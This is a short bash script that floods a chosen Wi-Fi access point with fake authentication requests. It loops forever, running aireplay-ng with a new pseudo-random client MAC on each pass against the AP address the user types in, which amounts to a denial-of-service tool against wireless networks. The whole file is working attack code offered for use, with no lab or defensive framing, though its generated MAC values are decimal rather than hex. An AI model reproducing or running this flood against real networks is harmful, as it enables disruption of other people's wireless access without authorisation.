#!/bin/bash

trap ctrl_c INT
function ctrl_c () {exit}

echo "Introduce the mac of the wifi"
read wifi_mac
echo "Introduce your interface in mode monitor"
read interface

while $true;do
        mac=$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))
        sudo timeout 0.3 aireplay-ng -1 0 -a $wifi_mac -h $mac $interface &>/dev/null
        echo "Sending: " $mac
done
